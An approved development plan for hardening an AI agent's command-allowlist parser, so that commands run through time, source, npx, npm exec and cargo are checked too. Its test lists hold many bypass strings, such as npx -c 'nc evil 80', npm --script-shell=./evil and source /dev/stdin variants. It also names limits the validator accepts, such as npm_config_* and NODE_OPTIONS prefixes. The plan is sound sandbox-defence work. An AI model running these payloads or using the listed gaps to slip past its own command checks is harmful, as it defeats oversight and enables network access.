---
status: approved
issue: 1784
spec: spec/2026-10-15-1784-unwrap-runners.md
---

# Plan: check what `time`, `source`, `npx` and `cargo watch` run

Self-contained. You do not need to open the intent or the spec.

**Problem.** In `apps/backend/security/ast_parser.py`, allowlisted commands
that run another program are checked only by name: `/usr/bin/time nc evil`
→ `['time']`, `source $X` → `['source']`, `npx -c 'nc evil'` and
`npm exec -c …` → the runner only, `cargo watch -s 'nc evil'` → `['cargo']`.

**Approved decisions** (all fail closed: anything outside the allow list
raises `UnparseableCommand`).

1. `time`: add `_skip_time_opts(tokens, j)` next to `_skip_timeout_opts`
   (`:438`) and register `"time": _skip_time_opts` in `_PREFIX_OPT_SKIPPERS`
   (`:446`). Loop while `tokens[j]` starts with `-`: `--` → return `j + 1`;
   in `{"-f", "-o", "--format", "--output"}` → `j += 2`; in
   `{"-p", "-a", "-v", "-q", "--portability", "--append", "--verbose",
   "--quiet"}` or starts with `--format=`/`--output=` → `j += 1`; else raise
   `UnparseableCommand(f"time option {tok} cannot be validated")`. Return `j`.
   `_unwrap_prefix` then checks literals and emits the command.
2. `source`/`.`: new `_unwrap_source(words, idx, depth, acc, *,
   dynamic_args)`; if there is an argument at `idx + 1`: require it literal
   (`_require_literal(words, idx + 1, idx + 2)`), and raise if its text starts
   with `-` or `_STDIN_SCRIPT.fullmatch(...)`. Register for `"source"` and
   `"."`.
3. Package runners: constants `_RUNNER_FLAGS = frozenset({"-y", "--yes",
   "--no", "-q", "--quiet", "--ignore-existing", "--no-install",
   "--include-workspace-root", "--workspaces", "-ws"})`,
   `_RUNNER_VALUE_OPTS = frozenset({"-p", "--package", "-w", "--workspace"})`.
   `_check_package_runner(words, start)`: `j = start`; loop while
   `j < len(words)`: `tok = words[j].word`; `--` → `j += 1`, stop; not
   starting with `-` → stop; `name = tok.split("=", 1)[0]`; if
   `name in _RUNNER_VALUE_OPTS`: `nxt = j + 1 if "=" in tok else j + 2`;
   elif `tok in _RUNNER_FLAGS`: `nxt = j + 1`; else raise (this covers `-c`,
   `--call`, `--shell-mode` and any unknown option; give `-c`/`--call`/
   `--shell-mode` the reason "runs a shell command string"); require
   `words[j:nxt]` literal; `j = nxt`. After the loop, if `j < len(words)`
   require `words[j]` literal (the package). Unwrappers: `"npx"`/`"pnpx"` →
   check from `idx + 1`; `"npm"` → if a word after `idx` equals `exec` or
   `x`, check from the word after the first such one.
4. `cargo`: new unwrapper; raise `UnparseableCommand("cargo watch runs shell
   commands from a long-running watcher; not permitted")` if any word after
   `idx` equals `watch`. `cargo-watch`: remove it from
   `apps/backend/project/command_registry/languages.py:70`.
5. Use a fresh variable instead of reassigning a loop variable; no magic
   numbers (the strict ruff ratchet).

## Steps

### Step 1 — regression tests

File: `tests/test_command_sandbox.py`.

- Append to `DYNAMIC_COMMAND_WORD` (parser raises), comment
  `# Runners that run another program (#1784).`:
  `"/usr/bin/time --bogus ls"`, `"source $X"`, `'. "$X"'`,
  `"source /dev/stdin"`, `"source -p x f"`, `"npx $X"`,
  `"npx -c 'nc evil 80'"`, `"npx --call 'nc evil 80'"`,
  `"npm exec -c 'nc evil 80'"`, `"npm x --call=nc"`, `"pnpx -c 'nc'"`,
  `"pnpx --shell-mode nc"`, `"npx --bogus x"`, `'npx -p "$P" x'`,
  `"cargo watch -s 'nc evil 80'"`, `"cargo watch -x test"`.
- Append to `BYPASS_PAYLOADS` (allowlist refuses):
  `"/usr/bin/time nc evil 80"`, `"/usr/bin/time -f %e nc evil 80"`,
  `"cargo-watch -s 'nc evil 80'"`.
- Add to `MUST_PARSE` (exact names):
  `"/usr/bin/time -f %e git status": ["time", "git"]`,
  `"source ./env.sh": ["source"]`, `'npx eslint -c cfg.json "$F"': ["npx"]`,
  `"npm exec --yes -- tsc": ["npm"]`, `"cargo test": ["cargo"]`
  (`npx --yes prettier --check .` is already there).

- Deviation (review of step 1): the `cargo-watch -s` row passes on unfixed
  code because the test directory has no `Cargo.toml`, so add
  `test_cargo_watch_not_allowlisted`, asserting `cargo-watch` is in no
  `LANGUAGE_COMMANDS` set.

Check: `pytest tests/test_command_sandbox.py -q` — the new
`DYNAMIC_COMMAND_WORD` rows, `test_cargo_watch_not_allowlisted`, the time `BYPASS_PAYLOADS` rows,
`cargo-watch -s`, and `/usr/bin/time -f %e git status` FAIL on unfixed code.

### Step 2 — the fix

Files: `apps/backend/security/ast_parser.py` (decisions 1-5) and
`apps/backend/project/command_registry/languages.py:70` (remove
`"cargo-watch",` and its line only; keep the comment above for the other
tools).

Check: `pytest tests/test_command_sandbox.py tests/test_plan_commands.py -q`
pass; `ruff check` and `ruff format --check` on both files.

### Step 3 — CHANGELOG

`### Security` bullet under `## [Unreleased]` in `CHANGELOG.md`.

### Step 4 — review fix: npm global options, cargo inline config (deviation)

Added after review of PR #1806. `_unwrap_npm` looked for the first `exec`/`x`
word but `npm -w x exec -c 'nc evil 80'` matched the `-w` value `x` and
checked the wrong words, and `npm --prefix x exec -c '…'` was not checked as
exec, so both returned only `['npm']`. `cargo --config
'target.x.runner="nc evil 80"' test` sets a runner inline.

File: `apps/backend/security/ast_parser.py`.

- `_unwrap_npm`: walk from `idx + 1`, `_require_literal` on each word up to
  and including the subcommand. Skip global flags from a new
  `_NPM_GLOBAL_FLAGS` (`-g`, `--global`, `-s`, `--silent`, `-q`, `--quiet`,
  `-d`, `--verbose`, `-y`, `--yes`, `-ws`, `--workspaces`,
  `--include-workspace-root`, `-v`, `--version`, `-h`, `--help`) and global
  options with a value from a new `_NPM_GLOBAL_VALUE_OPTS` (`-w`,
  `--workspace`, `--prefix`, `--loglevel`, `--registry`), each with its
  argument (the next word, or after `=`). `--` ends options. Any other word
  starting with `-` before the subcommand raises `UnparseableCommand`. The
  first non-option word is the subcommand; if it is `exec` or `x`, call
  `_check_package_runner(words, k + 1)`.
- `_unwrap_cargo`: for each `--config <v>` / `--config=<v>` anywhere after
  `cargo`, require a static literal value matching `[\w./-]+\.toml`
  (a config file path); anything else (inline `KEY=VALUE`) raises.

Tests (`tests/test_command_sandbox.py`): add to `DYNAMIC_COMMAND_WORD`
`npm -w x exec -c 'nc evil 80'`, `npm --prefix x exec -c 'nc evil 80'`,
`npm --workspace=x x --call nc`, `npm --bogus exec -c nc`,
`cargo --config 'target.x.runner="nc evil 80"' test`,
`cargo test --config=build.rustc=nc`; add to `MUST_PARSE`
`npm -w x exec --yes -- tsc`, `npm --prefix web run build`, `npm test`,
`cargo --config ci.toml test`.
From the #1800 review, also add to `DYNAMIC_COMMAND_WORD`
`source /dev/stdin <<< 'GIT_DIR=x'; git status`, `source <(cat f)`,
`. /dev/fd/0`, `source /proc/self/fd/0`; the existing `_STDIN_SCRIPT` check
and `_require_literal` (process substitution) already refuse them, so no
code change.

Check: `pytest tests/test_command_sandbox.py tests/test_plan_commands.py -q`;
`ruff check`, `ruff format --check`.

### Step 5 — re-review fix: npm options anywhere, `-p`, stdin paths (deviation)

Added after the re-review of PR #1806 (head c2de25a3). npm parses its own
options anywhere before `--`, not only before the subcommand or the package
name, so `npm exec prettier -c 'nc evil 80'` and
`npm run build --script-shell=./evil` passed. `-p`/`--package` lets the
operand after `--` be any command. The stdin check matched the raw path, so
`source /dev/./stdin` passed.

File: `apps/backend/security/ast_parser.py`.

1. Remove `-p` and `--package` from `_RUNNER_VALUE_OPTS` (they are then
   refused as unknown runner options, for npx/pnpx/npm exec).
2. `_unwrap_npm`: after the subcommand at `k` is found (existing loop),
   check every word in `words[k + 1 :]` until the first `--`:
   `_require_literal` on it (a `$X` there can expand to an option), and if it
   starts with `-`, its name (`tok.split("=", 1)[0]`) must be in
   `_NPM_GLOBAL_FLAGS | _NPM_GLOBAL_VALUE_OPTS | _NPM_SUBCOMMAND_OPTS`, plus
   `_RUNNER_FLAGS | _RUNNER_VALUE_OPTS` when the subcommand is `exec`/`x`;
   otherwise raise `UnparseableCommand`. An allowlist, not a denylist: npm
   accepts unambiguous abbreviations (`--script-sh`), so a denylist of
   `--script-shell`/`--node-options`/`--call` cannot be complete. Keep the
   existing `_check_package_runner(words, k + 1)` call for exec/x.
   New `_NPM_SUBCOMMAND_OPTS` (common install/run/test/ci/audit options):
   `--save`, `-S`, `--save-dev`, `-D`, `--save-exact`, `-E`,
   `--save-optional`, `-O`, `--save-peer`, `--no-save`, `--omit`,
   `--include`, `--production`, `--only`, `--legacy-peer-deps`,
   `--strict-peer-deps`, `--ignore-scripts`, `--no-audit`, `--no-fund`,
   `--force`, `-f`, `--dry-run`, `--json`, `--parseable`, `--depth`,
   `--all`, `-a`, `--audit-level`, `--if-present`, `--long`, `-l`,
   `--prefer-offline`, `--prefer-online`, `--offline`, `--no-package-lock`,
   `--package-lock-only`.
3. Stdin paths: add `_is_stdin_path(tok: str) -> bool` that applies
   `_STDIN_SCRIPT.fullmatch` to `os.path.normpath(tok)` with leading `/+`
   folded to one `/` (POSIX normpath keeps `//`). Widen `_STDIN_SCRIPT` to
   `-|/dev/.*|/proc/.*`: `/proc/self/root/dev/stdin` reaches stdin through
   the `root` link, so anything under `/proc` or `/dev` is refused. Use it in
   `_unwrap_dash_c` (`:258`) and `_unwrap_source` (`:522`).

Known limit (not fixable statically): a symlink to `/dev/stdin` created by an
earlier command (`ln -s /dev/stdin s; source s`), or a relative path after
`cd /dev`, is not caught. Also out of scope and reported separately:
`npm_config_*=… npm test` sets npm config through an environment prefix,
which no unwrapper sees.

Tests (`tests/test_command_sandbox.py`), add to `DYNAMIC_COMMAND_WORD`:
`npm exec prettier -c 'nc evil 80'`, `npm exec prettier --call='nc evil 80'`,
`npm x prettier -c 'nc evil 80'`, `npm -w x exec prettier -c 'nc evil 80'`,
`npm exec --package=x -- nc evil 80`, `npx -p x -- nc evil 80`,
`npm run build --script-shell=./evil`, `npm test --script-shell=./evil`,
`npm run-script build --script-shell ./evil`,
`npm run build --node-options=--require=./evil.js`,
`npm run build --script-sh=./evil`, `npm test $X`,
`source /dev/./stdin`, `source //dev/stdin`, `source /dev//stdin`,
`source /proc/self/../self/fd/0`, `source /proc/self/root/dev/stdin`,
`bash /dev/./stdin`. Add to `MUST_PARSE`: `npm install --save-dev x`: ["npm"],
`npm ci --ignore-scripts`: ["npm"], `npm run build -- --watch`: ["npm"],
`npm test -- --grep x`: ["npm"], `npm -w apps/web run test:e2e`: ["npm"].
Lead follow-up: also allow `--frozen-lockfile` and `--no-git-tag-version`
in `_NPM_SUBCOMMAND_OPTS`, and add the common agent npm commands (`npm ci`
variants, `npm install`/`i -D`, `run`/`test` with `--`, `--silent`,
`--if-present`, `-w`/`--workspace`, `audit`, `ls`, `outdated`, `pack`,
`version`) to `MUST_PARSE`. `--prefix`/`-w` stay allowed before every
subcommand; before exec/x the npx rules still apply.

Check: `pytest tests/test_command_sandbox.py tests/test_plan_commands.py -q`;
`ruff check`, `ruff format --check`.

### Step 6 — third review: the runner's target is checked like any command (deviation)

Added after the third review of PR #1806 (head c35cd4be). The npx/pnpx and
`npm exec`/`npm x` target never reached the allowlist: `npx -- nc evil 80`,
`npm exec -- nc evil 80`, `npx --yes -- sh -c '…'` and
`npm x -y -- bash -c '…'` were seen only as `npx`/`npm`.

File: `apps/backend/security/ast_parser.py`.

1. `_check_package_runner` returns the index of the package operand
   (`len(words)` when there is none) instead of `None`.
2. `_unwrap_npx` and the exec/x branch of `_unwrap_npm` call
   `_emit(words, j, depth + 1, acc, dynamic_args=dynamic_args)` on that
   operand when it exists (drop the `del depth, acc, dynamic_args`), so the
   target is recorded and recursively unwrapped (`bash -c` payloads are
   parsed, `nc` meets the allowlist). `npx prettier` then needs `prettier`
   allowed (it is, for node projects, via `command_registry/frameworks.py`).
3. Refuse `-y`/`--yes` for npx/pnpx/npm exec/npm x, anywhere before `--`
   including before the npm subcommand: they install a package without the
   prompt. Remove them from `_RUNNER_FLAGS`; in `_unwrap_npm`, when the
   subcommand is exec/x, raise if any word in `words[idx + 1 :]` before the
   first `--` has name `-y` or `--yes` (they stay in `_NPM_GLOBAL_FLAGS` for
   other subcommands, e.g. `npm init -y`).

Tests (`tests/test_command_sandbox.py`):
- Move out of `MUST_PARSE` (now refused, add to `DYNAMIC_COMMAND_WORD`):
  `npx --yes prettier --check .`, `npm exec --yes -- tsc`,
  `npm -w x exec --yes -- tsc`. Also add there: `npx --yes evil-pkg`,
  `npm -y exec tsc`, `npx --yes -- sh -c 'nc evil 80'`,
  `npm x -y -- bash -c 'nc evil 80'`.
- Add to `MUST_PARSE`: `npx prettier --check .`: ["npx", "prettier"],
  `npm exec -- tsc`: ["npm", "tsc"], `npm -w x exec -- tsc`: ["npm", "tsc"],
  `npx -- bash -c 'nc evil 80'`: ["npx", "bash", "nc"]; update
  `'npx eslint -c cfg.json "$F"'` to ["npx", "eslint"].
- Add to `BYPASS_PAYLOADS` (allowlist refuses): `npm exec -- nc evil 80`,
  `npx -- nc evil 80`, `npx nc evil 80`.

- `tests/test_plan_commands.py::test_extract_npx_first_token`: plan command
  extraction uses the same parser, so `npx playwright test` now yields
  `{"npx", "playwright"}` (the hook needs `playwright` granted); update the
  expectation.

Check: `pytest tests/test_command_sandbox.py tests/test_plan_commands.py -q`;
`ruff check`, `ruff format --check`.

**Accepted limits (not the command validator's boundary).** Each has the same
effect as editing `package.json` or `.npmrc`, which the agent can already do
with its file tools, and which `npm run` then runs:
- environment prefixes `npm_config_*=… npm …` (e.g. `npm_config_script_shell`);
- `NODE_OPTIONS=… npm …` / `NODE_OPTIONS=… node …`;
- `npm config set …` (writes `.npmrc`);
- `npm pkg set …` (writes `package.json`);
- `npm explore <pkg> -- <cmd>` (runs a command in a dependency's folder);
- `npm init <initializer>` (runs `create-<initializer>`);
- `npm create <initializer>` (same as `npm init`).

## Rollback

Revert the fix commit; the tests commit goes with it.
